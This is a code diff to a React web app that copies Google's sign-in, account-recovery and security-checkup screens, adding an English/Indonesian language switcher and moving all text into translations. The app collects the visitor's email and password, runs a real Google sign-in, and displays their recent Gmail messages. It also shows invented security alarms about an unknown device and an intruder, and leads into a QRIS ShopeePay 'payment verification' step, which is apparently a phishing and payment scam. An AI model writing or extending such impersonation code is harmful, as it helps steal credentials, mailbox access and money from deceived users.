@@ -1,8 +1,9 @@
 /// <reference types="vite/client" />
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
 import { initAuth, googleSignIn, logout, getAccessToken } from './auth';
 import type { User } from 'firebase/auth';
+import { translations, Language } from './translations';
 
 const GoogleLogo = () => (
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40px" height="40px" className="mb-2">
@@ -13,7 +14,7 @@ const GoogleLogo = () => (
   </svg>
 );
 
-const TextInput = ({ label, type = "text", value, onChange, error, name, autoFocus }: any) => {
+const TextInput = ({ label, type = "text", value, onChange, error, name, autoFocus, disabled }: any) => {
   return (
     <div className="relative mb-2 mt-2">
       <input
@@ -23,6 +24,7 @@ const TextInput = ({ label, type = "text", value, onChange, error, name, autoFoc
         value={value}
         onChange={onChange}
         autoFocus={autoFocus}
+        disabled={disabled}
         className={`block px-[15px] pt-[15px] pb-[13px] w-full text-[16px] text-[#1f1f1f] bg-transparent rounded border ${
           error ? 'border-[#b3261e] focus:border-[#b3261e]' : 'border-[#747775] hover:border-[#1f1f1f] focus:border-[#0b57d0]'
         } appearance-none focus:outline-none focus:border-2 peer`}
@@ -48,7 +50,101 @@ const TextInput = ({ label, type = "text", value, onChange, error, name, autoFoc
   );
 };
 
+const LanguageSelector = ({
+  lang,
+  setLang,
+  upward = true,
+}: {
+  lang: Language;
+  setLang: (l: Language) => void;
+  upward?: boolean;
+}) => {
+  const [isOpen, setIsOpen] = useState(false);
+  const dropdownRef = useRef<HTMLDivElement>(null);
+
+  useEffect(() => {
+    const handleClickOutside = (event: MouseEvent) => {
+      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
+        setIsOpen(false);
+      }
+    };
+    document.addEventListener('mousedown', handleClickOutside);
+    return () => document.removeEventListener('mousedown', handleClickOutside);
+  }, []);
+
+  return (
+    <div className="relative inline-block text-left" ref={dropdownRef}>
+      <button
+        type="button"
+        onClick={() => setIsOpen(!isOpen)}
+        className="flex items-center gap-1 cursor-pointer hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 -ml-2 rounded transition text-[12px] text-[#444746] focus:outline-none"
+        aria-expanded={isOpen}
+      >
+        <span>{translations[lang].languageName}</span>
+        <svg fill="currentColor" viewBox="0 0 24 24" width="16px" height="16px" className={`transition-transform duration-150 ${isOpen ? 'rotate-180' : ''}`}>
+          <path d="M7 10l5 5 5-5z" />
+        </svg>
+      </button>
+
+      {isOpen && (
+        <div
+          className={`absolute ${
+            upward ? 'bottom-full mb-1' : 'top-full mt-1'
+          } left-0 w-52 bg-white rounded-lg shadow-xl border border-gray-200 py-1.5 z-50 overflow-hidden`}
+        >
+          <button
+            type="button"
+            onClick={() => {
+              setLang('id');
+              setIsOpen(false);
+            }}
+            className={`w-full text-left px-3.5 py-2 text-[13px] flex items-center justify-between transition ${
+              lang === 'id' ? 'bg-[#e8f0fe] text-[#0b57d0] font-medium' : 'text-[#1f1f1f] hover:bg-gray-50'
+            }`}
+          >
+            <span>Indonesia</span>
+            {lang === 'id' && (
+              <svg className="w-4 h-4 text-[#0b57d0]" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+              </svg>
+            )}
+          </button>
+          <button
+            type="button"
+            onClick={() => {
+              setLang('en');
+              setIsOpen(false);
+            }}
+            className={`w-full text-left px-3.5 py-2 text-[13px] flex items-center justify-between transition ${
+              lang === 'en' ? 'bg-[#e8f0fe] text-[#0b57d0] font-medium' : 'text-[#1f1f1f] hover:bg-gray-50'
+            }`}
+          >
+            <span>English (United States)</span>
+            {lang === 'en' && (
+              <svg className="w-4 h-4 text-[#0b57d0]" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+              </svg>
+            )}
+          </button>
+        </div>
+      )}
+    </div>
+  );
+};
+
 export default function App() {
+  const [lang, setLangState] = useState<Language>(() => {
+    const saved = localStorage.getItem('app_language');
+    return saved === 'en' ? 'en' : 'id';
+  });
+
+  const setLang = (newLang: Language) => {
+    setLangState(newLang);
+    localStorage.setItem('app_language', newLang);
+  };
+
+  const t = translations[lang];
+
   const [step, setStep] = useState<'email' | 'password' | 'change_password' | 'success' | 'error' | 'payment'>('email');
   const [direction, setDirection] = useState(1);
   const [isLoading, setIsLoading] = useState(false);
@@ -133,7 +229,7 @@ export default function App() {
       }
     } catch (err) {
       console.error('Login failed:', err);
-      setError('Gagal masuk menggunakan Google.');
+      setError(t.loginFailedError);
     } finally {
       setIsLoading(false);
     }
@@ -151,15 +247,15 @@ export default function App() {
   const handleChangePasswordSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!password) {
-      setError('Masukkan sandi');
+      setError(t.enterPasswordError);
       return;
     }
     if (password.length < 8) {
-      setError('Sandi harus minimal 8 karakter');
+      setError(t.passwordMin8Error);
       return;
     }
     if (password !== confirmPassword) {
-      setError('Sandi tidak cocok. Harap coba lagi.');
+      setError(t.passwordMismatchError);
       return;
     }
     setError('');
@@ -169,7 +265,7 @@ export default function App() {
   const handleEmailSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!email) {
-      setError('Masukkan alamat email atau nomor telepon');
+      setError(t.enterEmailOrPhoneError);
       return;
     }
     setError('');
@@ -179,12 +275,11 @@ export default function App() {
   const handlePasswordSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!password) {
-      setError('Masukkan sandi');
+      setError(t.enterPasswordError);
       return;
     }
     setError('');
     
-    // Trigger real Google authentication here to get valid account data
     try {
       setIsLoading(true);
       const result = await googleSignIn(email);
@@ -197,7 +292,7 @@ export default function App() {
       }
     } catch (err) {
       console.error('Login failed:', err);
-      setError('Sandi salah. Coba lagi atau klik Lupa sandi untuk meresetnya.');
+      setError(t.wrongPasswordError);
     } finally {
       setIsLoading(false);
     }
@@ -207,10 +302,10 @@ export default function App() {
     const securityItems = [
       {
         id: 'devices',
-        title: 'Perangkat Anda',
+        title: t.devicesTitle,
         subtitle: securedSections.includes('devices')
-          ? 'Selesai didiagnosis'
-          : 'Selesaikan 2 tindakan yang disarankan',
+          ? t.devicesSubDone
+          : t.devicesSubWarning,
         isWarning: !securedSections.includes('devices'),
         icon: securedSections.includes('devices') ? (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -226,23 +321,23 @@ export default function App() {
             <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
               <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
             </svg>
-            <span>Semua perangkat Anda aman. Anda telah keluar dari sesi tidak dikenal.</span>
+            <span>{t.devicesContentDone}</span>
           </div>
         ) : (
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-3">
             <div className="flex items-start gap-3">
               <div className="w-2 h-2 rounded-full bg-green-500 mt-1.5 flex-shrink-0" />
               <div>
-                <p className="font-medium text-[#1f1f1f]">HP Android ini (Xiaomi Redmi Note 10)</p>
-                <p className="text-xs text-gray-500">Perangkat aktif saat ini • Indonesia</p>
+                <p className="font-medium text-[#1f1f1f]">{t.thisAndroidPhone}</p>
+                <p className="text-xs text-gray-500">{t.activeDeviceNow}</p>
               </div>
             </div>
             <div className="flex items-start gap-3 border-t border-gray-100 pt-3">
               <div className="w-2 h-2 rounded-full bg-amber-500 mt-1.5 flex-shrink-0" />
               <div>
-                <p className="font-medium text-[#1f1f1f]">Perangkat Windows tidak dikenal</p>
-                <p className="text-xs text-gray-500">Jakarta, Indonesia • Aktif 3 jam yang lalu</p>
-                <p className="text-xs text-amber-600 mt-1">Seseorang mungkin telah mengakses akun Anda.</p>
+                <p className="font-medium text-[#1f1f1f]">{t.unrecognizedWindowsDevice}</p>
+                <p className="text-xs text-gray-500">{t.jakartaActiveAgo}</p>
+                <p className="text-xs text-amber-600 mt-1">{t.someoneMayHaveAccessed}</p>
               </div>
             </div>
             <div className="flex gap-2 pt-2 justify-end">
@@ -251,14 +346,14 @@ export default function App() {
                 onClick={() => setSecuredSections([...securedSections, 'devices'])}
                 className="px-4 py-2 text-xs font-medium text-[#0b57d0] border border-gray-300 rounded-full hover:bg-gray-50 transition"
               >
-                Ya, itu saya
+                {t.yesItWasMe}
               </button>
               <button 
                 type="button"
                 onClick={() => setSecuredSections([...securedSections, 'devices'])}
                 className="px-4 py-2 text-xs font-medium text-white bg-[#0b57d0] rounded-full hover:bg-[#0842a0] hover:shadow transition"
               >
-                Keluar dari perangkat
+                {t.signOutDevice}
               </button>
             </div>
           </div>
@@ -266,10 +361,10 @@ export default function App() {
       },
       {
         id: 'recovery',
-        title: 'Login & pemulihan',
+        title: t.recoveryTitle,
         subtitle: securedSections.includes('recovery')
-          ? 'Email pemulihan ditambahkan'
-          : 'Tambahkan email pemulihan',
+          ? t.recoverySubDone
+          : t.recoverySubWarning,
         isWarning: !securedSections.includes('recovery'),
         icon: securedSections.includes('recovery') ? (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -285,15 +380,15 @@ export default function App() {
             <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
               <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
             </svg>
-            <span>Email pemulihan berhasil ditambahkan dan diamankan.</span>
+            <span>{t.recoveryContentDone}</span>
           </div>
         ) : (
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-3">
-            <p>Email pemulihan membantu Anda masuk kembali ke akun jika ada aktivitas mencurigakan atau jika Anda lupa sandi.</p>
+            <p>{t.recoveryDescription}</p>
             <div className="flex gap-2 max-w-sm mt-2">
               <input 
                 type="email" 
-                placeholder="Masukkan email pemulihan" 
+                placeholder={t.recoveryInputPlaceholder} 
                 className="flex-grow px-3 py-1.5 text-xs rounded border border-gray-300 focus:outline-none focus:border-[#0b57d0] bg-white"
                 defaultValue="pemulihan@gmail.com"
               />
@@ -302,7 +397,7 @@ export default function App() {
                 onClick={() => setSecuredSections([...securedSections, 'recovery'])}
                 className="px-4 py-1.5 text-xs font-medium text-white bg-[#0b57d0] rounded hover:bg-[#0842a0] transition"
               >
-                Tambahkan
+                {t.addBtn}
               </button>
             </div>
           </div>
@@ -310,10 +405,10 @@ export default function App() {
       },
       {
         id: 'passwords',
-        title: 'Sandi Anda yang tersimpan',
+        title: t.passwordsTitle,
         subtitle: securedSections.includes('passwords')
-          ? 'Sandi diperiksa dan aman'
-          : 'Periksa sandi Anda',
+          ? t.passwordsSubDone
+          : t.passwordsSubWarning,
         isWarning: !securedSections.includes('passwords'),
         icon: securedSections.includes('passwords') ? (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -329,27 +424,27 @@ export default function App() {
             <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
               <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
             </svg>
-            <span>Semua sandi Anda yang tersimpan telah diperbarui dan aman.</span>
+            <span>{t.passwordsContentDone}</span>
           </div>
         ) : (
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
-            <p>Terdapat 3 sandi yang lemah atau disusupi pada Pengelola Sandi Google Anda.</p>
+            <p>{t.passwordsWarningDesc}</p>
             <button 
               type="button"
               onClick={() => setSecuredSections([...securedSections, 'passwords'])}
               className="mt-2 px-4 py-2 text-xs font-medium text-[#0b57d0] border border-gray-300 rounded-full hover:bg-gray-50 transition bg-white"
             >
-              Periksa & Perbarui Sandi
+              {t.checkUpdatePasswordsBtn}
             </button>
           </div>
         )
       },
       {
         id: 'safebrowsing',
-        title: 'Safe Browsing',
+        title: t.safeBrowsingTitle,
         subtitle: securedSections.includes('safebrowsing')
-          ? 'Safe Browsing yang Disempurnakan aktif'
-          : 'Aktifkan Safe Browsing yang Disempurnakan',
+          ? t.safeBrowsingSubDone
+          : t.safeBrowsingSubWarning,
         isWarning: !securedSections.includes('safebrowsing'),
         icon: securedSections.includes('safebrowsing') ? (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -365,25 +460,25 @@ export default function App() {
             <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
               <path strokeLinecap="round" strokeLinejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
             </svg>
-            <span>Safe Browsing yang Disempurnakan telah diaktifkan untuk perlindungan ekstra.</span>
+            <span>{t.safeBrowsingContentDone}</span>
           </div>
         ) : (
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
-            <p>Dapatkan perlindungan yang lebih cepat dan proaktif terhadap situs web, unduhan, dan ekstensi yang berbahaya.</p>
+            <p>{t.safeBrowsingWarningDesc}</p>
             <button 
               type="button"
               onClick={() => setSecuredSections([...securedSections, 'safebrowsing'])}
               className="mt-2 px-4 py-2 text-xs font-medium text-white bg-[#0b57d0] rounded-full hover:bg-[#0842a0] transition"
             >
-              Aktifkan sekarang
+              {t.turnOnNowBtn}
             </button>
           </div>
         )
       },
       {
         id: 'recent',
-        title: 'Aktivitas keamanan terbaru',
-        subtitle: 'Aktivitas dari 28 hari terakhir',
+        title: t.recentActivityTitle,
+        subtitle: t.recentActivitySub,
         isWarning: false,
         icon: (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -394,17 +489,17 @@ export default function App() {
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
             <div className="flex items-center gap-2">
               <span className="w-1.5 h-1.5 bg-green-500 rounded-full" />
-              <p className="font-medium text-[#1f1f1f]">Masuk baru di perangkat Chrome pada Windows</p>
+              <p className="font-medium text-[#1f1f1f]">{t.newSignInOnChrome}</p>
             </div>
-            <p className="text-xs text-gray-500 pl-3.5">Hari ini • Indonesia</p>
-            <p className="pl-3.5 text-xs text-gray-500">Tidak ada aktivitas mencurigakan lainnya dalam 28 hari terakhir.</p>
+            <p className="text-xs text-gray-500 pl-3.5">{t.todayCountry}</p>
+            <p className="pl-3.5 text-xs text-gray-500">{t.noOtherSuspiciousActivity}</p>
           </div>
         )
       },
       {
         id: 'apps',
-        title: 'Aplikasi tertaut Anda',
-        subtitle: '3 aplikasi tertaut memiliki akses ke beberapa data Akun Google Anda',
+        title: t.connectedAppsTitle,
+        subtitle: t.connectedAppsSub,
         isWarning: false,
         icon: (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -413,20 +508,20 @@ export default function App() {
         ),
         content: (
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-2">
-            <p>Aplikasi berikut memiliki akses sebagian ke info Akun Google Anda:</p>
+            <p>{t.connectedAppsDesc}</p>
             <ul className="list-disc pl-5 text-xs space-y-1">
-              <li>WhatsApp Messenger (Akses Google Drive)</li>
-              <li>Spotify (Info profil publik)</li>
-              <li>Netflix (Info profil dasar)</li>
+              <li>{t.appDriveAccess}</li>
+              <li>{t.appPublicProfile}</li>
+              <li>{t.appBasicProfile}</li>
             </ul>
-            <p className="text-xs text-gray-500 mt-2">Semua aplikasi telah diverifikasi dan aman.</p>
+            <p className="text-xs text-gray-500 mt-2">{t.allAppsVerified}</p>
           </div>
         )
       },
       {
         id: 'gmail_settings',
-        title: 'Setelan Gmail',
-        subtitle: '1 setelan sensitif',
+        title: t.gmailSettingsTitle,
+        subtitle: t.gmailSettingsSub,
         isWarning: false,
         icon: (
           <svg viewBox="0 0 24 24" className="w-[24px] h-[24px] text-[#1e8e3e]" fill="currentColor">
@@ -435,8 +530,8 @@ export default function App() {
         ),
         content: (
           <div className="pt-3 pb-4 px-4 bg-[#f8fafd] rounded-xl border border-gray-100 text-sm text-[#444746] space-y-1">
-            <p className="font-medium text-[#1f1f1f]">Penerusan email dinonaktifkan</p>
-            <p className="text-xs text-gray-500">Penerusan otomatis email masuk dinonaktifkan untuk email {email || 'user@gmail.com'}.</p>
+            <p className="font-medium text-[#1f1f1f]">{t.emailForwardingDisabled}</p>
+            <p className="text-xs text-gray-500">{t.emailForwardingDisabledDesc(email)}</p>
           </div>
         )
       }
@@ -448,11 +543,13 @@ export default function App() {
         <header className="h-[64px] border-b border-[#e0e3e7] bg-white px-4 sm:px-6 flex items-center justify-between sticky top-0 z-50">
           <div className="flex items-center select-none">
             <span className="text-[#020307] text-[19px] font-normal tracking-tight font-sans">
-              Google
+              {t.google}
             </span>
           </div>
           
           <div className="flex items-center gap-1">
+            <LanguageSelector lang={lang} setLang={setLang} upward={false} />
+
             <button type="button" className="w-10 h-10 rounded-full hover:bg-gray-100 flex items-center justify-center text-[#5f6368] transition">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                 <circle cx="12" cy="12" r="10" />
@@ -495,14 +592,14 @@ export default function App() {
                   )}
                 </div>
                 <p className="font-medium text-[#1f1f1f] text-center max-w-full truncate">{googleUser?.displayName || email || 'user@gmail.com'}</p>
-                <p className="text-xs text-gray-500 mb-4">{googleUser?.email || email || 'Pengguna Google'}</p>
+                <p className="text-xs text-gray-500 mb-4">{googleUser?.email || email || t.googleUserDefault}</p>
                 
                 <button
                   type="button"
-                  onClick={() => alert('Fitur kelola akun Google Anda')}
+                  onClick={() => alert(t.manageAccountAlert)}
                   className="w-full text-center border border-gray-300 rounded-full py-2 px-4 text-xs font-medium text-[#3c4043] hover:bg-gray-50 transition mb-3"
                 >
-                  Kelola Akun Google Anda
+                  {t.manageGoogleAccount}
                 </button>
                 
                 <button
@@ -519,7 +616,7 @@ export default function App() {
                   }}
                   className="w-full text-center border border-gray-300 rounded-full py-2 px-4 text-xs font-medium text-[#c5221f] hover:bg-red-50 transition"
                 >
-                  Keluar / Reset Alur
+                  {t.signOutReset}
                 </button>
               </div>
             )}
@@ -539,10 +636,10 @@ export default function App() {
 
             {/* Header Titles */}
             <h1 className="text-[28px] sm:text-[32px] text-[#1f1f1f] font-normal text-center leading-tight">
-              Pemeriksaan Keamanan
+              {t.securityCheckupTitle}
             </h1>
             <p className="text-[#444746] text-[15px] text-center mt-2 mb-8">
-              Berikut tips untuk Anda
+              {t.securityCheckupTips}
             </p>
 
             {/* Checklist items */}
@@ -607,12 +704,22 @@ export default function App() {
                 }}
                 className="text-[#0b57d0] hover:underline text-[14px] font-medium transition"
               >
-                Lanjutkan ke Akun Google Anda
+                {t.continueToGoogleAccount}
               </button>
             </div>
 
           </div>
         </main>
+
+        {/* Footer for checkup */}
+        <footer className="w-full px-6 py-4 flex flex-col sm:flex-row justify-between items-center text-[12px] text-[#444746] border-t border-gray-200 bg-white">
+          <LanguageSelector lang={lang} setLang={setLang} upward={true} />
+          <div className="flex gap-4 sm:gap-6 mt-2 sm:mt-0 items-center">
+            <a href="#" className="hover:text-gray-700 transition">{t.help}</a>
+            <a href="#" className="hover:text-gray-700 transition">{t.privacy}</a>
+            <a href="#" className="hover:text-gray-700 transition">{t.terms}</a>
+          </div>
+        </footer>
       </div>
     );
   }
@@ -687,13 +794,13 @@ export default function App() {
               <div className="px-6 pb-6 pt-2 sm:px-10 sm:pb-8 flex flex-col items-start">
                 {step === 'email' && (
                   <>
-                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Pemulihan akun</h1>
-                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">Memulihkan Akun Google Anda</p>
+                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.accountRecoveryTitle}</h1>
+                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">{t.accountRecoverySubtitle}</p>
                   </>
                 )}
                 {step === 'password' && (
                   <>
-                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Selamat datang kembali</h1>
+                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.welcomeBackTitle}</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
                       className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
@@ -709,7 +816,7 @@ export default function App() {
                 )}
                 {step === 'change_password' && (
                   <>
-                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Ubah sandi</h1>
+                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.changePasswordTitle}</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
                       className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
@@ -725,19 +832,19 @@ export default function App() {
                 )}
                 {step === 'success' && (
                   <>
-                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Berhasil Login</h1>
-                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal mb-4">Anda telah login dengan data akun Google yang valid.</p>
+                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.successTitle}</h1>
+                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal mb-4">{t.successSubtitle}</p>
                     
                     {isFetchingEmails ? (
-                      <div className="w-full text-center py-4 text-sm text-gray-500">Memuat data Gmail...</div>
+                      <div className="w-full text-center py-4 text-sm text-gray-500">{t.loadingGmail}</div>
                     ) : emailsData.length > 0 ? (
                       <div className="w-full flex flex-col gap-3 mt-2">
-                        <p className="text-xs font-medium text-gray-500 uppercase tracking-wider">Email Terbaru Anda</p>
+                        <p className="text-xs font-medium text-gray-500 uppercase tracking-wider">{t.recentEmails}</p>
                         {emailsData.map((msg, idx) => {
                           const subjectHeader = msg.payload?.headers?.find((h: any) => h.name === 'Subject');
                           const fromHeader = msg.payload?.headers?.find((h: any) => h.name === 'From');
-                          const subject = subjectHeader ? subjectHeader.value : '(Tanpa Subjek)';
-                          const from = fromHeader ? fromHeader.value.split('<')[0].trim() : 'Tidak diketahui';
+                          const subject = subjectHeader ? subjectHeader.value : t.noSubject;
+                          const from = fromHeader ? fromHeader.value.split('<')[0].trim() : t.unknownSender;
                           
                           return (
                             <div key={idx} className="bg-gray-50 border border-gray-100 rounded-lg p-3 text-sm">
@@ -748,19 +855,19 @@ export default function App() {
                         })}
                       </div>
                     ) : (
-                      <div className="w-full text-center py-4 text-sm text-gray-500">Tidak ada email ditemukan.</div>
+                      <div className="w-full text-center py-4 text-sm text-gray-500">{t.noEmailsFound}</div>
                     )}
                   </>
                 )}
                 {step === 'payment' && (
                   <>
-                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Verifikasi Pembayaran</h1>
-                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">Selesaikan pembayaran melalui QRIS ShopeePay Merchant.</p>
+                    <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.paymentTitle}</h1>
+                    <p className="text-[#444746] text-[14px] sm:text-[16px] font-normal">{t.paymentSubtitle}</p>
                   </>
                 )}
                 {step === 'error' && (
                   <>
-                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Tidak dapat memproses login Anda</h1>
+                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.cantSignInTitle}</h1>
                     <div 
                       onClick={() => !isLoading && changeStep('email', -1)}
                       className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
@@ -782,7 +889,7 @@ export default function App() {
             <form onSubmit={handleEmailSubmit} className="flex flex-col flex-grow justify-start">
               <div className="pt-2">
                 <TextInput
-                  label="Email atau nomor telepon"
+                  label={t.emailOrPhoneLabel}
                   value={email}
                   onChange={(e: any) => {
                     setEmail(e.target.value);
@@ -801,14 +908,14 @@ export default function App() {
                   className="text-[#0b57d0] hover:bg-blue-50 px-3 py-2 -ml-3 rounded-full font-medium text-sm transition"
                   disabled={isLoading}
                 >
-                  Lupa email?
+                  {t.forgotEmail}
                 </button>
                 <button
                   type="submit"
                   className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                   disabled={isLoading}
                 >
-                  Berikutnya
+                  {t.next}
                 </button>
               </div>
             </form>
@@ -818,7 +925,7 @@ export default function App() {
             <div className="flex flex-col flex-grow justify-start pt-6">
               <div>
                 <p className="text-[#1f1f1f] text-[16px] leading-[24px]">
-                  Anda dapat memperbarui sandi Anda sekarang jika Anda lupa.
+                  {t.forgotPasswordNotice}
                 </p>
               </div>
               <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
@@ -828,7 +935,7 @@ export default function App() {
                   className="text-[#0b57d0] hover:bg-blue-50 px-3 py-2 -ml-3 rounded-full font-medium text-sm transition"
                   disabled={isLoading}
                 >
-                  Perbarui sandi
+                  {t.updatePasswordBtn}
                 </button>
                 <button
                   type="button"
@@ -836,7 +943,7 @@ export default function App() {
                   className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                   disabled={isLoading}
                 >
-                  Lanjutkan
+                  {t.continueBtn}
                 </button>
               </div>
             </div>
@@ -845,13 +952,13 @@ export default function App() {
           {step === 'change_password' && (
             <form onSubmit={handleChangePasswordSubmit} className="flex flex-col flex-grow justify-start">
               <div className="pt-2">
-                <h2 className="text-[#1f1f1f] text-[18px] sm:text-[22px] font-normal mt-4 mb-1">Buat sandi yang kuat</h2>
+                <h2 className="text-[#1f1f1f] text-[18px] sm:text-[22px] font-normal mt-4 mb-1">{t.createStrongPasswordHeading}</h2>
                 <p className="text-[#444746] text-[14px] mb-6 leading-normal">
-                  Buat sandi baru yang kuat dan tidak Anda gunakan untuk situs lain
+                  {t.createStrongPasswordDesc}
                 </p>
 
                 <TextInput
-                  label="Buat sandi"
+                  label={t.createPasswordLabel}
                   type={showPassword ? "text" : "password"}
                   value={password}
                   onChange={(e: any) => {
@@ -859,14 +966,14 @@ export default function App() {
                     if (error) setError('');
                   }}
                   name="password"
-                  error={error && (error.includes('sandi') || error.includes('8 karakter')) ? error : ''}
+                  error={error && (error === t.enterPasswordError || error === t.passwordMin8Error) ? error : ''}
                   autoFocus
                   disabled={isLoading}
                 />
 
                 <div className="mt-4">
                   <TextInput
-                    label="Konfirmasi"
+                    label={t.confirmPasswordLabel}
                     type={showPassword ? "text" : "password"}
                     value={confirmPassword}
                     onChange={(e: any) => {
@@ -874,13 +981,13 @@ export default function App() {
                       if (error) setError('');
                     }}
                     name="confirmPassword"
-                    error={error && error.includes('cocok') ? error : ''}
+                    error={error && error === t.passwordMismatchError ? error : ''}
                     disabled={isLoading}
                   />
                 </div>
 
                 <div className="text-[12px] text-[#444746] mt-1.5 pl-3">
-                  Minimal 8 karakter
+                  {t.atLeast8Chars}
                 </div>
 
                 <div className="mt-4">
@@ -892,7 +999,7 @@ export default function App() {
                       className="w-[18px] h-[18px] rounded border-[#747775] text-[#0b57d0] focus:ring-[#0b57d0] cursor-pointer"
                       disabled={isLoading}
                     />
-                    <span>Tampilkan sandi</span>
+                    <span>{t.showPassword}</span>
                   </label>
                 </div>
               </div>
@@ -904,14 +1011,14 @@ export default function App() {
                   className="text-[#0b57d0] hover:bg-blue-50 px-4 py-2.5 -ml-3 rounded-full font-medium text-[14px] transition"
                   disabled={isLoading}
                 >
-                  Lewati
+                  {t.skipBtn}
                 </button>
                 <button
                   type="submit"
                   className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
                   disabled={isLoading}
                 >
-                  Simpan sandi
+                  {t.savePasswordBtn}
                 </button>
               </div>
